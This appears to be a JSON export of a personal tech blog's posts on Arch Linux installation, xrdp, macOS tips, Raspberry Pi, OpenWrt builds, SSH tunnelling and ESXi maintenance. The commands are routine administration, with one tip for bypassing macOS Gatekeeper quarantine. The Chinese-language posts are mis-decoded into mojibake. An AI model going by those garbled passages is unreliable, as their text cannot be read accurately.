[{"content":"arch linux install note\nPre-installation verify image signature\ngpg --keyserver-options auto-key-retrieve --verify archlinux-version-x86_64.iso.sig\nBoot Option before boot up, update BIOS Boot Options to EFI\nInstall partition disk list disks fdisk -l\nuse fdisk to modify disk partition tables\nfdisk /dev/sda\nexample:\n500 MiB for EFI system partition 2048 MiB for Linux swap remainder for Linux root partition step:\ng # create a new empty GPT partition table n # create 1st partition 1 # default[1] first partition # default[2048] first sector +500M # first partition size n # create 2nd partition 2 # default[2] # default first sector +2048M # 2nd partition size n # create root partition # default[3] # default first sector # default size t # change partition type 1 # first partition 1 # partition type or alias, type 1: EFI System t # change partition type 2 # 2nd partition 19 # partition type or alias, type 19:Linux swap w # save check partition\nfdisk -l\nformat partition first partition EFI system partition to FAT32 mkfs.fat -F 32 /dev/sda1\n2nd partition swap to swap mkswap /dev/sda2\n3rd partition root to ext4 mkfs.ext4 /dev/sda3\nMount disk # mount root partition to /mnt mount /dev/sda3 /mnt # mount EFI partition to /mnt/boot mount --mkdir /dev/sda1 /mnt/boot #create swap swapon /dev/sda2 Install change download mirrors for Mainland China user edit /etc/pacman.d/mirrorlist\nadd\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch to the top of Server list\nupdate cache\npacman -Syy\ninstall linux base pacstrap /mnt base linux linux-firmware\nConfigure # generate fstab genfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab # chroot arch-chroot /mnt # set timezone ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # install package pacman -S nano netctl dhcpcd # Localization echo \u0026#34;en_US.UTF-8 UTF-8\u0026#34; | tee -a /etc/locale.gen locale-gen echo \u0026#34;LANG=en_US.UTF-8\u0026#34; \u0026gt; /etc/locale.conf # hostname echo \u0026#34;archlinux\u0026#34; \u0026gt; /etc/hostname # set root\u0026#39;s password passwd Boot loader # install package grub and efibootmgr pacman -S grub efibootmgr mkdir /boot/grub grub-mkconfig \u0026gt; /boot/grub/grub.cfg # install grub grub-install --efi-directory=/boot --target=x86_64-efi /dev/sda # reboot to archlinux reboot setup network Static IP Address using netctl check network devices ip link\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: ens33: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:0c:29:19:2b:bf brd ff:ff:ff:ff:ff:ff altname enp2s1 network device name is ens33\nconfigure copy example file to etc\ncp /etc/netctl/examples/ethernet-static /etc/netctl/ens33\nedit /etc/netctl/ens33\nDescription=\u0026#39;A basic static ethernet connection\u0026#39; Interface=eth0 Connection=ethernet IP=static Address=(\u0026#39;192.168.1.23/24\u0026#39; \u0026#39;192.168.1.87/24\u0026#39;) #Routes=(\u0026#39;192.168.0.0/24 via 192.168.1.2\u0026#39;) Gateway=\u0026#39;192.168.1.1\u0026#39; DNS=(\u0026#39;192.168.1.1\u0026#39;) ## For IPv6 autoconfiguration #IP6=stateless ## For IPv6 static address configuration #IP6=static #Address6=(\u0026#39;1234:5678:9abc:def::1/64\u0026#39; \u0026#39;1234:3456::123/96\u0026#39;) #Routes6=(\u0026#39;abcd::1234\u0026#39;) #Gateway6=\u0026#39;1234:0:123::abcd\u0026#39; stop dhcp client\nsystemctl disable --now dhcpcd\nsetup auto start\nnetctl enable ens33\nstart\nnetctl start ens33\nDynamic IP Address copy example configure file\ncp /etc/netctl/examples/ethernet-dhcp /etc/netctl/enp2s1\nDescription=\u0026#39;A basic dhcp ethernet connection\u0026#39; Interface=enp2s1 Connection=ethernet IP=dhcp #DHCPClient=dhcpcd #DHCPReleaseOnStop=no ## for DHCPv6 #IP6=dhcp #DHCP6Client=dhclient ## for IPv6 autoconfiguration #IP6=stateless enable and start dhcp client\nsystemctl enable --now dhcpcd\nPost-install add user useradd --create-home tian add user to sudoers usermod -aG wheel tian # usermod --append --groups wheel tian update sudoers file\npacman -S sudo visudo uncomment the following line\n%wheel ALL=(ALL) ALL\nremove from sudoers\ngpasswd -d tian wheel other package for manage pacman -S net-tools dnsutils ","date":"2022-08-13T13:44:43+08:00","permalink":"https://hitian.info/post/arch-linux-install/","title":"arch linux install note"},{"content":"è®© ubuntu 20.04 æ”¯æŒ Microsoft Remote Desktop è¿œç¨‹æ¡Œé¢è¿æ¥\nå®‰è£…ä¾èµ– è¿™é‡Œå®‰è£…äº†æ¡Œé¢ xfce4 , ä¸ªäººæ„Ÿè§‰ubuntuè‡ªå¸¦çš„GNOME 3å¹¶ä¸æ˜¯å¾ˆæ–¹ä¾¿è¿œç¨‹æ¡Œé¢ä½¿ç”¨ğŸ˜¶\nsudo apt install xrdp xorg xfce4 xfce4-goodies dbus-x11 x11-xserver-utils xfce4-terminal è®¾ç½®æœåŠ¡å’Œé…ç½® å°†æ¡Œé¢æ›´æ”¹ä¸º xfce, ç¼–è¾‘æ–‡ä»¶ /etc/xrdp/startwm.sh\n# å°†è¿™ä¸¤è¡Œæ³¨é‡Š #test -x /etc/X11/Xsession \u0026amp;\u0026amp; exec /etc/X11/Xsession #exec /bin/sh /etc/X11/Xsession # æ–°å¢ exec startxfce4 è®¾ç½®xsession\necho xfce4-session \u0026gt; ~/.xsession è®¾ç½® xrdp è‡ªå¯åŠ¨å¹¶é‡å¯ sudo systemctl enable --now xrdp sudo systemctl restart xrdp å®‰è£…æ³¨æ„ xrdp é»˜è®¤å¼€æ”¾ 3389/TCP åˆ°æ‰€æœ‰çš„ç½‘å¡, å¦‚æœè¦è·¨å…¬ç½‘ä½¿ç”¨, æœ€å¥½ä½¿ç”¨ufwé™åˆ¶ä¸€ä¸‹å¯ä»¥è¿æ¥çš„ipæ®µ, å¦å¤–ä¿®æ”¹é»˜è®¤çš„ç«¯å£ä¹Ÿèƒ½å‡å°‘è¢«è¯•æ¢çš„æ¦‚ç‡\n","date":"2021-09-12T14:15:39+08:00","permalink":"https://hitian.info/post/setup-ubuntu-for-microsoft-remote-desktop/","title":"Setup Ubuntu for Microsoft Remote Desktop"},{"content":"Alias alias show_tcp_port=\u0026#34;lsof -nP -iTCP\u0026#34; alias show_tcp_port_listen=\u0026#34;lsof -nP -iTCP | grep LISTEN\u0026#34; disable .DS_Store on network storage defaults write com.apple.desktopservices DSDontWriteNetworkStores true disable gatekepper for binary exec e.g. perforce command p4\ntian@mac-mini ~ % xattr -p com.apple.quarantine `which p4` 0082;5fb2322c;Safari; tian@mac-mini ~ % xattr -d com.apple.quarantine `which p4` xattr: [Errno 13] Permission denied: \u0026#39;/usr/local/bin/p4\u0026#39; tian@mac-mini ~ % sudo xattr -d com.apple.quarantine `which p4` Password: tian@mac-mini ~ % xattr -p com.apple.quarantine `which p4` xattr: /usr/local/bin/p4: No such xattr: com.apple.quarantine tian@mac-mini ~ % create macOS install usb disk sudo /Applications/Install\\ macOS\\ Big\\ Sur.app/Contents/Resources/createinstallmedia --volume /Volumes/UDISK --applicationpath /Applications/Install\\ macOS\\ Big\\ Sur.app ","date":"2021-09-10T14:03:48+08:00","permalink":"https://hitian.info/post/macos-developer-tips/","title":"macOS tips for developer"},{"content":"é’ˆå¯¹Firefox for macOS 79.0 (64-bit)\nå¦‚æœmacOSæœ‰å¤šå—å±å¹•ï¼Œ åœ¨é»˜è®¤é…ç½®ä¸‹ firefox å…¨å±æ—¶ä¼šéšè—æ‰€æœ‰å±å¹•çš„èœå•æ ï¼Œéœ€è¦æ‰‹åŠ¨æ”¹é…ç½®ä¿®å¤ã€‚\nåœ°å€æ è¾“å…¥å¹¶æ‰“å¼€ about:config å¿½ç•¥é£é™©æç¤ºå¹¶æœç´¢ full-screen-api åŒå‡» full-screen-api.macos-native-full-screen å°†é…ç½®æ›´æ”¹ä¸º true ","date":"2020-08-01T00:00:00Z","permalink":"https://hitian.info/post/fix-firefox-macos-full-sceen/","title":"ä¿®å¤macOSä¸Šçš„Firefoxåœ¨å…¨å±æ—¶ä¼šéšè—æ‰€æœ‰å±å¹•èœå•æ çš„é—®é¢˜"},{"content":"Raspberry Pi ç¬”è®° Bç³»åˆ—ç¡¬ä»¶å‚æ•° Version CPU Arch RAM USB Boot from USB Ethernet Wireless Release 1 B BCM2835 700MHz 32-bit ARM1176JZFS 256/512MB USB2 * 2 No 10/100Â Mbit/s - 2012 Apr~Jun 1 B+ BCM2835 700MHz 32-bit ARM1176JZFS 256/512MB USB2 * 4 No 10/100Â Mbit/s - 2014 Jul 2 B v1.1 BCM2836 900MHz 32-bit quad-core ARM Cortex-A7 1GB USB2 * 4 No 10/100Â Mbit/s - 2015 Feb 2 B v1.2 BCM2837 900MHz ~ 1.2GHz 64-bit quad-core ARM Cortex-A53 1GB USB2 * 4 Yes 10/100Â Mbit/s - 2016 Oct 3 B BCM2837 1.2GHz 64-bit quad-core ARM Cortex-A53 1GB USB2 * 4 Yes 10/100Â Mbit/s 2.4G WIFI + Bluetooth 4.1 2016 Feb 3 B+ BCM2837B0 1.4GHz 64-bit quad-core ARM Cortex-A53 1GB USB2 * 4 Yes 10/100/300 Mbit/s 2.4/5G WIFI + Bluetooth 4.2 LS 2018 Mar 4 B BCM2711 1.5GHz 64-bit quad-core ARM Cortex-A72 1/2/4/8GB USB2 * 2 + USB3 * 2 Yes 10/100/1000 Mbit/s 2.4/5G WIFI + Bluetooth 5.0 2019 Jun å¸¸ç”¨çš„ç³»ç»Ÿ å®˜æ–¹raspbian ç³»ç»Ÿ https://www.raspberrypi.org/downloads/raspbian/\nå¯ç”¨äºæ‰€æœ‰å‹å·çš„raspberrypi\nä¼˜ç‚¹\nåŸºäºdebianï¼Œä½¿ç”¨ apt åŒ…ç®¡ç†å·¥å…·ï¼Œ ç»å¸¸ä½¿ç”¨ Ubuntu çš„è¯ï¼Œ è¿˜æ˜¯æ¯”è¾ƒé¡ºæ‰‹çš„ åŒ…å« raspi-config (Raspberry Pi Software Configuration Tool), æ–¹ä¾¿è°ƒæ•´å‚æ•° ç¼ºç‚¹\nç›®å‰åªæœ‰ 32-bit çš„ç³»ç»Ÿ(armhf) 1ã€2ä»£æ¨èä½¿ç”¨\nUbuntu MATE https://ubuntu-mate.org/raspberry-pi/\nModel B 2, 3 or 3+ é€‚ç”¨\nä¼˜ç‚¹\nåŸºäº Ubuntuï¼Œä½¿ç”¨ apt åŒ…ç®¡ç†å·¥å…· ä½¿ç”¨ Ubuntu meta çš„æ¡Œé¢ï¼Œå¹²å‡€ï¼Œä¸ªäººåå¥½ ç¼ºç‚¹\nåŒæ ·åªæœ‰ 32-bit çš„ç³»ç»Ÿ(armhf) æ¨èéœ€è¦å¹²å‡€æ¡Œé¢+æµè§ˆå™¨çš„ç”¨æˆ·ä½¿ç”¨\nOSMC è¿™æ˜¯ä¸€ä¸ª Kodi çš„å‘è¡Œç‰ˆæœ¬ï¼Œç”¨æ ‘è“æ´¾å°†å®¶é‡Œçš„ç”µè§†å˜æˆåª’ä½“ä¸­å¿ƒï¼Œæ’­æ”¾å†…ç½‘ä¸‹è½½å¥½çš„è§†é¢‘ï¼Œæˆ–è€…å®‰è£…æ’ä»¶ç›´æ¥æ’­æ”¾ç½‘ç»œè§†é¢‘\nhttps://osmc.tv/download/\nå¯ç”¨äºæ‰€æœ‰å‹å·çš„raspberrypiï¼Œ å‹æƒ…æç¤ºï¼Œ æœ€å¥½åœ¨æœ‰æœ‰çº¿ç½‘ç»œæ¥å£(USBç½‘å¡ä¹Ÿå¯ä»¥)çš„piä¸Šä½¿ç”¨ï¼Œ ä½¿ç”¨2.4G Wi-Fiæ’­æ”¾é«˜æ¸…è§†é¢‘ç»å¯¹ä¼šå¡çš„\nUbuntu Server ä½œä¸ºæœåŠ¡å™¨ä½¿ç”¨æ¨è\nUbuntu 20.04 LTS (Focal Fossa) http://cdimage.ubuntu.com/releases/20.04/release/\nRaspberry Pi Generic (Hard-Float) preinstalled server image\nFor 32-bit\nRaspberry Pi Generic (64-bit ARM) preinstalled server image\nFor 64-bit\nç³»ç»Ÿé•œåƒæ–‡ä»¶å†™å…¥SD/TFå¡ ç®€å•æ¨¡å¼ æ¨èæ–°æ‰‹ä½¿ç”¨Etcher https://github.com/balena-io/etcher/releases\nWindows, linux, macOS å¯ç”¨\nå‘½ä»¤è¡Œæ¨¡å¼ sudo dd if=2019-07-10-raspbian-buster-full.img of=/dev/rdisk2 bs=1m\nlinux, macOS å¯ç”¨ï¼Œä¸åŒç³»ç»Ÿä¸Šç›®æ ‡ç£ç›˜çš„æ ¼å¼å¯èƒ½ä¸å¤ªä¸€æ ·ï¼ŒmacOS æ³¨æ„ /dev/disk2 å’Œ /dev/rdisk2 çš„åŒºåˆ«ï¼Œrdiskå†™å…¥é€Ÿåº¦ä¼šå¿«10å€ä»¥ä¸Š\næ³¨æ„ï¼Œddä¼šè¦†ç›–ç£ç›˜ä¸Šçš„æ•°æ®ï¼Œè°¨æ…æ“ä½œã€‚\nä½¿ç”¨USBç¡¬ç›˜å¯åŠ¨ å‚è€ƒå®˜æ–¹è¯´æ˜ https://www.raspberrypi.org/documentation/hardware/raspberrypi/bootmodes/msd.md\nç®€å•çš„è¯´å°±æ˜¯ 3 B+ åŠä»¥ä¸Šç¡¬ä»¶ç‰ˆæœ¬å¯ä»¥ç›´æ¥ä»USBè®¾å¤‡å¯åŠ¨\nä¹‹å‰çš„ç¡¬ä»¶ç‰ˆæœ¬éœ€è¦æ‰‹åŠ¨æ›´æ”¹å¯åŠ¨æ¨¡å¼\nå¸¸ç”¨å‘½ä»¤ ç³»ç»Ÿé…ç½® (å®˜æ–¹raspbian ç³»ç»Ÿå¯ç”¨) sudo raspi-config\næŸ¥çœ‹æ ‘è“æ´¾çš„å‹å· cat /proc/device-tree/model\næŸ¥çœ‹æœ‰çº¿ç½‘ç»œå½“å‰çš„é“¾æ¥é€Ÿåº¦ å•ä½mb cat /sys/class/net/eth0/speed\næŸ¥çœ‹å½“å‰æ ¸å¿ƒæ¸©åº¦ (é™¤1000ä¸ºæ‘„æ°åº¦) cat /sys/class/thermal/thermal_zone0/temp\n","date":"2019-08-25T00:00:00Z","permalink":"https://hitian.info/post/raspberry-pi-note/","title":"Raspberry Pi note"},{"content":"åœ¨dockerä¸­ç¼–è¯‘openwrt build docker image Docker file\n{% gist 88ff8a7cad5deffad51d8c29d5c47d75 Dockerfile %}\ndocker build --no-cache -t ubuntu-openwrt-build .\nbuild clone openwrt source code\ngit clone https://git.openwrt.org/openwrt/openwrt.git\n# æ›´æ–°è½¯ä»¶åŒ… docker run -it --rm -v $PWD:/build ubuntu-openwrt-build ./scripts/feeds update -a # ä½¿ç”¨ menuconfig è®¾ç½®ç¼–è¯‘ç›®æ ‡ã€å†…æ ¸ä¿¡æ¯ã€ä»¥åŠéœ€è¦å®‰è£…çš„åŒ… docker run -it --rm -v $PWD:/build ubuntu-openwrt-build make menuconfig # ç¼–è¯‘ docker run -it --rm -v $PWD:/build ubuntu-openwrt-build make -j4 ç”Ÿæˆçš„æ–‡ä»¶ä¼šæ”¾ç½®åœ¨binç›®å½•ä¸‹, ä¾‹å¦‚ MT7621 æ”¾åœ¨ bin/targets/ramips/mt7621\n#é…ç½®æ–‡ä»¶ï¼ŒåŒè¿è¡Œ make menuconfig åç”Ÿæˆçš„.config æ–‡ä»¶ï¼Œå¯ä»¥ç”¨äºå¤‡ä»½å’Œè¿˜åŸé…ç½® config.seed openwrt-ramips-mt7621-device-pbr-m1-t.manifest openwrt-ramips-mt7621-pbr-m1-t-initramfs-kernel.bin #é¦–æ¬¡åˆ·æœºä½¿ç”¨ openwrt-ramips-mt7621-pbr-m1-t-squashfs-sysupgrade.bin #æ›´æ–°ä½¿ç”¨ packages #ç¼–è¯‘å¥½çš„è®¾ç½®ä¸ºç¼–è¯‘ä½†æ˜¯ä¸å®‰è£…çš„åŒ… æ·»åŠ æ–°è®¾å¤‡ ç¤ºä¾‹ https://github.com/hitian/openwrt/commit/22df459310836b92caa8fb1796885f670214d25a#diff-8dabb1882176c362bafecc664a7af2ee\n","date":"2019-08-10T00:00:00Z","permalink":"https://hitian.info/post/openwrt-build-docker/","title":"åœ¨dockerä¸­ç¼–è¯‘openwrt"},{"content":"é…ç½®sshå®¢æˆ·ç«¯çš„è¡Œä¸º é…ç½®æ–‡ä»¶è·¯å¾„ ~/.ssh/config\né’ˆå¯¹ç›®æ ‡ä¸»æœºçš„é…ç½®å—ç¤ºä¾‹\nHost deploy-gw HostName [__target_hostname_or_ip__] User game IdentityFile ~/.ssh/deploy_private_key ProxyCommand [__connect_command__] é…ç½®è§£é‡Š é™¤äº†Hostä¹‹å¤–ï¼Œ å…¶å®ƒçš„éƒ½æ˜¯å¯é€‰çš„ Host deploy-gw å®šä¹‰ä½¿ç”¨æ—¶çš„åå­—ï¼Œä¹‹åä½¿ç”¨ ssh deploy-gw ç™»å½•ç›®æ ‡ï¼Œè¿™ä¸ªåªæ˜¯åˆ«åï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥å†™hostname æˆ–è€…IPåœ°å€; å½“ä½¿ç”¨ Hostname æ—¶å¯ä»¥è¿›è¡ŒåŒ¹é…ï¼Œ ä¾‹å¦‚ Host *.hitian.info å¯ä»¥åŒ¹é…åˆ° a.hitian.info.\nHostName [__target_hostname_or_ip__] ç›®æ ‡çš„ä¸»æœºåæˆ–è€…IPåœ°å€\nUser tian ç”¨æˆ·å\nIdentityFile ~/.ssh/deploy_private_key æŒ‡å®šä½¿ç”¨çš„private keyè·¯å¾„ã€‚ æ›¿ä»£sshçš„ -i å‚æ•°ä¸€æ ·æ•ˆæœ\nProxyCommand ssh -q [__local_gw__] nc [__target_addr__] 22 è¿æ¥ç›®æ ‡ä¸»æœºæ—¶ä½¿ç”¨çš„å‘½ä»¤\nssh via [http or socks proxy] ä½¿ç”¨åœºæ™¯: ç”±äºä¸å¯æŠ—æ‹’çš„å› ç´ æ— æ³•ç›´æ¥ssh åˆ°è¿œç¨‹ä¸»æœºï¼Œæˆ–è€…é“¾æ¥è¿‡ç¨‹ä¸­ä¼šè¢«å¼‚å¸¸é˜»æ–­æ—¶\nè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª connect å‘½ä»¤ï¼Œéœ€è¦è‡ªè¡Œå®‰è£…ä¸€ä¸‹ã€‚\nProvides SOCKS and HTTPS proxy support to SSH https://bitbucket.org/gotoh/connect/wiki/Home macOS å¯ä»¥åˆ©ç”¨brew ç›´æ¥å®‰è£…, å…¶å®ƒå¹³å°å¯ä»¥æŒ‰è¯´æ˜æ‰§è¡Œç¼–è¯‘å®‰è£…\nbrew install connect è¦è®©sshä½¿ç”¨proxyè¿æ¥åˆ°ç›®æ ‡ä¸»æœºï¼Œåœ¨config ä¸­æ·»åŠ ProxyCommandé…ç½®\nä½¿ç”¨ http ä»£ç†\nProxyCommand connect -H http_proxy_addr:port %h %p\nä½¿ç”¨ socks ä»£ç†\nProxyCommand connect -S socks_proxy_addr:port %h %p\nè¯¦ç»†çš„connectä½¿ç”¨è¯´æ˜å¯ä»¥å‚ç…§å®˜æ–¹wiki\nssh via ssh ä½¿ç”¨åœºæ™¯ï¼š\nä¾‹å¦‚éœ€è¦é€šè¿‡æŸå°sshçš„ç½‘å…³æ‰èƒ½é“¾æ¥åˆ°å†…ç½‘çš„å…¶å®ƒsshæœåŠ¡å™¨\nå½“ç„¶å¯ä»¥é€šè¿‡å…ˆsshåˆ°ç½‘å…³ï¼Œå†sshåˆ°ç›®æ ‡ä¸»æœºçš„æ–¹å¼ç®€å•å®ç°ï¼Œä½†æ˜¯è¿™è¦æ±‚åœ¨ç½‘å…³æœºå™¨ä¸Šæ”¾ä¸€ä»½ç›®æ ‡ä¸»æœºçš„ç§é’¥ã€‚\nå¦‚æœä¸æƒ³å°†ç§é’¥ç»™ç½‘å…³æœºå™¨ã€‚å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹å¼\nä½¿ç”¨ nc å‘½ä»¤å®ç°è½¬å‘ï¼Œ ncåœ¨macOSå’Œä¸»æµLinuxä¸Šå·²ç»å†…ç½®\nåœ¨config ä¸­æ·»åŠ ProxyCommandé…ç½®\nProxyCommand ssh -q gateway_host nc target_host 22\nè¿™é‡Œ gateway_host ä¸ºç½‘å…³ï¼Œ nc åä¸ºç›®æ ‡çš„ä¸»æœºå’Œsshdçš„ç«¯å£å·ï¼Œ é¦–å…ˆè¦ä¿è¯å¯ä»¥æ­£å¸¸ssh åˆ°gateway_hostã€‚\nè¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥å®ç°æ›´é•¿çš„è½¬å‘é“¾\nä¾‹å¦‚è¦ç›´æ¥åœ¨localç™»å½•target åªéœ€è¦åœ¨æœ¬åœ°åˆ†åˆ«ä¸ºa, b, target é…ç½®ProxyCommandå°±å¯ä»¥äº†ï¼Œå¦ˆå¦ˆå†ä¹Ÿä¸éœ€è¦æ‹…å¿ƒæˆ‘è¦ä¸€å±‚ä¸€å±‚sshåˆ°è¿œç¨‹æœºå™¨äº†:)\nlocal -\u0026gt; gateway -\u0026gt; a -\u0026gt; b -\u0026gt; target socks proxy over ssh ä½¿ç”¨åœºæ™¯ï¼šéœ€è¦è®¿é—®ç›®æ ‡ä¸»æœºçš„localhostï¼Œæˆ–è€…ç›®æ ‡ä¸»æœºå†…ç½‘çš„èµ„æºæ—¶ï¼Œ å¦‚æœå®¢æˆ·ç«¯æ— æ³•ä½¿ç”¨socksé“¾æ¥éœ€è¦çš„èµ„æºï¼Œè¯·å‚è€ƒä¸‹ä¸€ç§æ–¹å¼\nåœ¨æœ¬åœ°ç›‘å¬1089ç«¯å£ã€‚å°†è¯·æ±‚é€šè¿‡sshéš§é“è½¬å‘åˆ°target_host\nssh -D 1089 target_host port forward via ssh ä½¿ç”¨åœºæ™¯ï¼š ç›´æ¥åœ¨æœ¬åœ°è¯·æ±‚ç›®æ ‡ä¸»æœºå†…ç½‘çš„æœåŠ¡æ—¶\nä¸¾ä¸ªä¾‹å­\ngateway æœåŠ¡å™¨çš„å†…ç½‘æœ‰ä¸€å°mysqlæœåŠ¡å™¨è¿è¡Œåœ¨ 10.0.0.3:3306ï¼Œ æœ¬åœ°çš„mysqlå®¢æˆ·ç«¯æ— æ³•ç›´æ¥é“¾æ¥ã€‚ æˆ‘ä»¬å¯ä»¥é‡‡ç”¨sshæ¥æ˜ å°„ç«¯å£åˆ°æœ¬åœ°\nssh -L localhost:3306:10.0.0.3:3306 target_host Lå‚æ•°çš„æ ¼å¼ æœ¬åœ°åœ°å€:æœ¬åœ°ç›‘å¬ç«¯å£:è¿œç¨‹åœ°å€:è¦æ˜ å°„çš„è¿œç¨‹ç«¯å£\nä¸Šé¢çš„å‘½ä»¤å¯ä»¥ç›´æ¥å°†è¿œç¨‹mysqlæœåŠ¡å™¨çš„3306ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„3306ç«¯å£ï¼Œ åœ¨æœ¬åœ°å¯ä»¥ç›´æ¥ä½¿ç”¨mysql -h localhostè¿æ¥ã€‚\nå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨0.0.0.0ï¼Œå°†æœ¬åœ°çš„ç«¯å£å¼€æ”¾ç»™æœ¬åœ°çš„å…¶å®ƒä¸»æœºä½¿ç”¨\nssh -L 0.0.0.0:3306:10.0.0.3:3306 target_host ä¸ç¨³å®šçš„ç½‘ç»œä¸­ä½¿ç”¨ssh ç”±äºsshä½¿ç”¨çš„TCPé“¾æ¥ï¼Œåœ¨ä¸ç¨³å®šçš„ç½‘ç»œä¸­ä½¿ç”¨sshä¼šå¾ˆå®¹æ˜“æ–­å¼€ï¼Œæ¨èä½¿ç”¨ mosh https://mosh.org/\nmosh ä¼šä½¿ç”¨ Protocol Buffers + UDP çš„æ–¹å¼ä¼ è¾“sshæ•°æ®ï¼ŒåŒ…å«æ•°æ®çš„å‹ç¼©å’Œæ–­çº¿é‡è¿ï¼ŒåŸæœ‰çš„sshé…ç½®å’Œæƒé™éƒ½ä¸éœ€è¦é¢å¤–çš„å˜æ›´\næ³¨æ„ï¼šmoshå®¢æˆ·ç«¯åœ¨å¯åŠ¨çš„æ—¶å€™ä¼šsshåˆ°è¿œç¨‹çš„ä¸»æœºï¼Œå¯åŠ¨ä¸€ä¸ªmosh-server å¹¶é»˜è®¤ç›‘å¬åœ¨ä¸€ä¸ª60000-61000ä¹‹é—´çš„UDPç«¯å£ã€‚è€Œä¸”æ¯å¼€å¯ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯ï¼Œ éƒ½ä¼šåœ¨æœåŠ¡å™¨ä¸Šå¼€ä¸€ä¸ªæ–°çš„udpç«¯å£ï¼Œéœ€è¦é˜²ç«å¢™æ”¾å¿ƒå¯¹åº”çš„UDPç«¯å£æ®µ.\niOSä¸Šçš„å®¢æˆ·ç«¯æ¨è https://github.com/blinksh/blink\nTHE END\n","date":"2019-01-05T00:00:00Z","permalink":"https://hitian.info/post/ssh-proxy-forward/","title":"ssh ä»£ç†å’Œè½¬å‘é‚£äº›äº‹"},{"content":"æ–°å¹´å¿«ä¹ï¼ ğŸŠğŸ‰\n","date":"2019-01-01T00:00:00Z","permalink":"https://hitian.info/post/happy-new-year/","title":"æ–°å¹´å¿«ä¹"},{"content":"Check the latest version Vmware Official https://my.vmware.com/group/vmware/patch#search\nor\nVMware ESXi Patch Tracker https://esxi-patches.v-front.de/ESXi-6.7.0.html\nInstall # From https://esxi-patches.v-front.de/ESXi-6.7.0.html # Cut and paste these commands into an ESXi shell to update your host with this Imageprofile # See the Help page for more instructions # esxcli network firewall ruleset set -e true -r httpClient esxcli software profile update -p ESXi-6.7.0-20181104001-standard \\ -d https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml esxcli network firewall ruleset set -e false -r httpClient # # Reboot to complete the upgrade IF Errno 28 No space left on device!!! download the offline update zip file here. https://my.vmware.com/group/vmware/patch#search\nupload to Datastores via webUI Install esxcli software profile update -p ESXi-6.7.0-20181104001-standard \\ -d update_zip_file_path ","date":"2018-12-30T00:00:00Z","permalink":"https://hitian.info/post/vmware-esxi-upgrade/","title":"vmware esxi install update patch"},{"content":"esxi çš„è¯ä¹¦ç®¡ç†é¡µé¢è²Œä¼¼æœ‰bugä¸€ç›´æ— æ³•æ›´æ–°è¯ä¹¦ï¼Œè¿™é‡Œç›´æ¥sshç™»é™†æœåŠ¡å™¨æ›¿æ¢\nå¼€å¯SSH\nLet\u0026rsquo;s Encrypt ç­¾å‘çš„è¯ä¹¦ç›®å½•å¦‚ä¸‹\nhitian :: ~ Â» ls -al .acme.sh/hitian.me/ total 36 drwxr-xr-x 2 tian tian 4096 Mar 20 14:59 . drwx------ 8 tian tian 4096 May 27 15:41 .. -rw-r--r-- 1 tian tian 1648 May 19 00:26 ca.cer -rw-r--r-- 1 tian tian 3803 May 19 00:26 fullchain.cer -rw-r--r-- 1 tian tian 2155 May 19 00:26 hitian.me.cer -rw-r--r-- 1 tian tian 529 May 19 00:26 hitian.me.conf -rw-r--r-- 1 tian tian 980 May 19 00:24 hitian.me.csr -rw-r--r-- 1 tian tian 220 May 19 00:24 hitian.me.csr.conf -rw-r--r-- 1 tian tian 1675 Mar 20 14:55 hitian.me.key exsi çš„é…ç½®ç›®å½•å¦‚ä¸‹\n[root@localhost:/etc/vmware/ssl] ls -al total 36 drwxr-xr-x 1 root root 512 Jun 3 18:34 . -r--r--r-T 1 root root 0 Apr 3 21:24 .#castore.pem -r-------T 1 root root 0 Apr 3 21:24 .#rui.bak -r--r--r-T 1 root root 0 Apr 3 21:24 .#rui.crt -r-------T 1 root root 0 Apr 3 21:24 .#rui.key drwxr-xr-x 1 root root 512 Jul 12 00:28 .. -rw-r--r-- 1 root root 1050 Jun 3 18:34 castore.pem -rw-r--r-- 1 root root 3859 Jun 3 18:34 iofiltervp.pem -r--r--r-- 1 root root 229 Apr 3 21:24 openssl.cnf -r-------- 1 root root 5231 Jun 3 18:34 rui.bak -rw-r--r-- 1 root root 3803 Jul 12 00:26 rui.crt -rw------- 1 root root 1675 Jul 12 00:27 rui.key -rw-r--r-T 1 root root 0 Apr 3 21:50 vsan_kms_castore.pem -rw-r--r-T 1 root root 0 Apr 3 21:50 vsan_kms_castore_old.pem -rw-r--r-T 1 root root 0 Apr 3 21:50 vsan_kms_client.crt -rw-r--r-T 1 root root 0 Apr 3 21:50 vsan_kms_client.key -rw-r--r-T 1 root root 0 Apr 3 21:50 vsan_kms_client_old.crt -rw-r--r-T 1 root root 0 Apr 3 21:50 vsan_kms_client_old.key -rw-r--r-T 1 root root 0 Apr 3 21:50 vsanvp_castore.pem ä½¿ç”¨ fullchain.cer è¦†ç›– rui.crt ä½¿ç”¨ hitian.me.key è¦†ç›– rui.key è¦†ç›–å‰å…ˆå¤‡ä»½ä¸€ä¸‹ï¼Œé˜²æ­¢å‘ç”Ÿæ„å¤–\næ¥ä¸‹æ¥éœ€è¦é‡å¯UIè®©é…ç½®ç”Ÿæ•ˆ\n/etc/init.d/hostd restart /etc/init.d/vpxa restart ","date":"2018-07-12T00:00:00Z","permalink":"https://hitian.info/post/vmware-esxi-upgrade-ssl-certificate/","title":"æ›´æ–°vmware esxi sslè¯ä¹¦"},{"content":"å‡†å¤‡Ubuntu Server å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ ubuntu server, å¯ä»¥ä½¿ç”¨ç½‘æ˜“å¼€æºé•œåƒç«™åŠ 